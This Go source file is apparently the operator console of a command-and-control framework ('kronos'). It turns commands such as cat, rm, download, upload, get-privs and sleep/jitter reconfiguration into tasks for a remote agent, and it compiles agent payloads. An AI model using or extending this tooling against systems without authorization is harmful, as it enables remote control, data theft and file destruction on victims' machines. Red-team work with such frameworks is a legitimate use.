package cli

import (
	"encoding/json"
	"fmt"
	"strings"
	"github.com/spf13/pflag"

	"github.com/z3vxo/kronos/internal/ui"
	"github.com/z3vxo/kronos/internal/payloadgen"
)

var CmdCodeMap = map[string]int{
	"proc":      0,
	"cmd":       1,
	"cat":       2,
	"ls":        3,
	"rm":        4,
	"mv":        5,
	"pwd":       6,
	"cd":        7,
	"cp":        8,
	"rmdir":     9,
	"get-privs": 10,
	"mkdir":     11,
	"download":  12,
	"upload":    13,
	"reconfig":  14,
}

func (c *CLI) requireAgent() bool {
	if c.ClientInUse == "" {
		c.ui.Send(ui.BAD.Sprint("Must be using agent"))
		return false
	}
	return true
}

func (c *CLI) sendTask(cmd string, param1 string, param2 string) bool {
	payload := TaskEntry{
		Guid:     c.ClientInUse,
		Cmd_type: CmdCodeMap[cmd],
		Param1:   param1,
		Param2:   param2,
	}

	data, err := json.Marshal(&payload)
	if err != nil {
		c.ui.Send(ui.BAD.Sprintf("Failed marshaling json: %s", err))
		return false
	}

	if err := c.http.DoPost("ts/rest/tasks/new", data, nil); err != nil {
		c.ui.Send(ui.WARN.Sprintf("Failed Inserting command: %s", err))
		return false
	}

	c.ui.PrintTitle(fmt.Sprintf("Tasked %s", c.ui.InUse))
	return true
}

func (c *CLI) HandleRMDIR(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) == 0 {
		c.ui.Send(ui.BAD.Sprint("Usage: rmdir <dir>"))
		return
	}
	c.sendTask("rmdir", strings.Join(args, " "), "")
}

func (c *CLI) HandleLS(args []string) {
	if !c.requireAgent() {
		return
	}
	var dir string
	if len(args) == 0 {
		dir = "."
	} else {
		dir = strings.Join(args, " ")
	}

	c.sendTask("ls", dir, "")
}

func (c *CLI) HandleMKDIR(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) == 0 {
		c.ui.Send(ui.BAD.Sprint("Usage: mkdir <dir>"))
		return
	}
	c.sendTask("mkdir", strings.Join(args, " "), "")
}

func (c *CLI) HandleGETPRIVS(args []string) {
	if !c.requireAgent() {
		return
	}

	c.sendTask("get-privs", "", "")
}

func (c *CLI) HandleRM(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) == 0 {
		c.ui.Send(ui.BAD.Sprint("Usage: rm <file>"))
		return
	}
	c.sendTask("rm", strings.Join(args, " "), "")
}

func (c *CLI) HandleCAT(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) == 0 {
		c.ui.Send(ui.BAD.Sprint("Usage: cat <file>"))
		return
	}
	c.sendTask("cat", strings.Join(args, " "), "")
}

func (c *CLI) HandlePROC(args []string) {
	if !c.requireAgent() {
		return
	}

	c.sendTask("proc", "", "")
}

func (c *CLI) HandlePWD(args []string) {
	if !c.requireAgent() {
		return
	}

	c.sendTask("pwd", "", "")
}

func (c *CLI) HandleCD(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) != 1 {
		c.ui.Send(ui.BAD.Sprint("Usage: cd <dir>"))
		return
	}

	c.sendTask("cd", args[0], "")
}

func (c *CLI) HandleCP(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) != 2 {
		c.ui.Send(ui.BAD.Sprint("Usage: cp <old> <new>"))
		return
	}

	c.sendTask("cp", args[0], args[1])
}

func (c *CLI) HandleMV(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) != 2 {
		c.ui.Send(ui.BAD.Sprint("Usage: mv <src> <dst>"))
		return
	}

	c.sendTask("mv", args[0], args[1])
}


func (c *CLI) HandleReconfig(args []string) {
	if !c.requireAgent() {
		return
	}

	if len(args) != 2 {
		c.ui.Send(ui.BAD.Sprint("Usage: reconfig <sleep> <jitter>"))
		return
	}

	c.sendTask("reconfig", args[0], args[1])
}


func (c *CLI) HandleGenerate(args []string) {
	if len(args) < 1 {
		c.ui.Send(ui.BAD.Sprint("Usage: hades generate/profile"))
		return
	}

	action := args[0]
	switch action {
	case "generate":
		c.GenerateAgent(args[1:])
		return
	case "profile":
		return
	default:
		c.ui.Send(ui.BAD.Sprint("Unknown sub command"))
	}

}

func (c *CLI) GenerateAgent(args []string) {
	fs := pflag.NewFlagSet("generate", pflag.ContinueOnError)
	payloadFormat := fs.StringP("format", "f", "exe", "")
	name := fs.StringP("name", "o", "hades", "")
	debug := fs.BoolP("debug", "d", false, "")

	if err := fs.Parse(args); err != nil {
		c.ui.Send(ui.WARN.Sprintf("[!] %v", err))
		return
	}

	if err := payloadgen.GenerateProfile(); err != nil {
		c.ui.Send(ui.BAD.Sprintf("Failed Generating profile: %v", err))
		return
	}

	file, err := payloadgen.Compile(*name, *payloadFormat, *debug)
	if err != nil {
		c.ui.Send(ui.BAD.Sprintf("Failed Generating profile: %v", err))
		return
	}

	c.ui.Send(ui.GOOD.Sprintf("Agent Generate: %s", file))
	return
}